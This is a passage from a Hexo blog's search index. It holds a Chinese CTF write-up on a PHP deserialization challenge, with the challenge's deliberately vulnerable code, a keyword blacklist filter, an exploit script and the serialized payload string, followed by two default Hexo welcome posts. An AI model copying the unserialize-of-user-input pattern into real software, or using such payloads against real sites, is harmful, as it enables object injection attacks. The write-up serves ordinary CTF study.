class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;stop&quot;</span>,<span class="hljs-variable">$payload</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pswd</span> = <span class="hljs-string">&#x27;sunshine&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$payload</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$payload</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$profile</span>-&gt;pswd==<span class="hljs-string">&#x27;escaping&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;逃出来了, 恭喜恭喜&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>   <br></code></pre></td></tr></table></figure><p>传入的序列化数据会先通过<code>filter</code>函数进行替换，然后再进入反序列化函数。然后反序列化后的对象中的<code>pswd</code>值需要为<code>excaping</code></p><p>这道题不理解考点，完全不需要逃。只需要改一下<code>pswd</code>的值即可。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pswd</span> = <span class="hljs-string">&#x27;escaping&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><code>O:4:&quot;test&quot;:1:&#123;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test</title>
    <link href="/2025/04/22/test/"/>
    <url>/2025/04/22/test/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/04/22/hello-world/"/>
    <url>/2025/04/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><hr><blockquote><p>你好</p></blockquote><ul><li>无序列表项 一<ul><li>子无序列表 一</li><li>子无序列表 二<ul><li>子无序列表 三</li></ul></li></ul></li><li>无序列表项 二</li><li>无序列表项 三</li></ul><ol><li>有序列表项 一<ol><li>子有序列表项 一</li><li>子有序列表项 二</li></ol></li><li>有序列表项 二</li><li>有序列表项 三</li></ol>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
